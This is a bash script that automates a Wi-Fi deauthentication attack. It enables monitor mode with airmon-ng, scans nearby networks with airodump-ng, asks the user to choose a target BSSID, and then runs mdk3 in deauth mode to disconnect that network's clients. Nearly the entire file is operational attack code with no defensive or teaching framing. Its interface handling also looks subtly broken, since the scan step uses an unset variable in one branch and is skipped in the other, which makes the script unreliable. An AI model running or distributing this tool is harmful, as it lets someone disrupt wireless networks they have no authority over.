#!/bin/bash

line(){
  echo "-----------------------------------------"
}
rm -rf /tmp/dmp* 2>/dev/null

# obtaining interfaces
airmon-ng 1>/tmp/airmon.dat

awk '{print $2, $3, $4}' /tmp/airmon.dat | tail -n +4 | head -n -1 | awk '{print NR, $1, "\t", $2, "\t", $3}' 1>/tmp/interface.dat

line
echo -e "\tInterfaces available"
line
cat /tmp/interface.dat
line
max_opt=$(wc -l /tmp/interface.dat | cut -d " " -f 1)
mon=$(grep -n "mon" /tmp/interface.dat)
if [ -z "$mon" ];then
while read -p "Enter your option (1-$max_opt) : " opt;do
 if [ $opt -gt $max_opt -o $opt -lt 1 ];then
 echo -e "Invalid input !! Retry !!"
 else break;
 fi
done
 iface=$(tail -n +$opt /tmp/interface.dat | head -n 1 | cut -d " " -f 2)
else
 ml=$(grep -n "mon" /tmp/interface.dat | cut -d ":" -f 1)
 miface=$(head -n $ml /tmp/interface.dat | tail -n +$ml | cut -d " " -f 2)
 echo -e "Monitor mode found..\nRunning airodump-ng with $miface"
fi
line

# running airmon-ng
echo -ne "airmon-ng check kill\t["
airmon-ng check kill 1>/dev/null
if [ $? -eq 0 ];then echo " DONE ]"; else echo " FAILED ]"; fi
# starting network-manager
echo -ne "Starting NetworkManager\t["
service NetworkManager start 1>/dev/null
if [ $? -eq 0 ];then echo " DONE ]"; else echo " FAILED ]"; fi
# running airodump
if [ -z "$miface" ];then
echo -e "airmon-ng start $iface"
airmon-ng start $iface 1>/dev/null
if [ $? -ne 0 ]; then echo -e "monitor mode is not supported on $iface !! Exiting .."; exit; fi
echo -e "Starting airodump-ng... Please wait..\nYou can press Ctrl+C to stop airodump !"
sleep 3
airodump-ng --output-format csv --write /tmp/dmp $miface
fi
tput clear
line
echo -e "\tFollowing Targets were found"
if [ -e /tmp/dmp-01.csv ];then
x=$(grep --line-number -i "station" /tmp/dmp-01.csv | cut -d ":" -f 1)
y=$(( x-1 ))
head -n $y /tmp/dmp-01.csv 1>/tmp/dmp.csv
egrep -o "([A-Z0-9]{2}[\:]){5}[A-Z0-9]{2}" /tmp/dmp.csv 1>/tmp/dmp2.csv
line
cut -d "," --output-delimiter "  " -f 1,14 /tmp/dmp.csv | head -n -1 | tail -n +3 | awk 'BEGIN {OFS="  "} {print NR,"  ", $0}' 1>/tmp/dmp3.dat
cat /tmp/dmp3.dat
line
fi

# choose BSSID
read -p "Enter your option : " bss
line
bssid=$(head -n $bss /tmp/dmp3.dat | tail -n +$bss | awk '{print $2}')
echo $bssid > /tmp/blacklist.txt

# run mdk3
if [ -z "$miface" ]; then
 mdk3 ${iface}mon d -b /tmp/blacklist.txt -c
else
 mdk3 $miface d -b /tmp/blacklist.txt -c
fi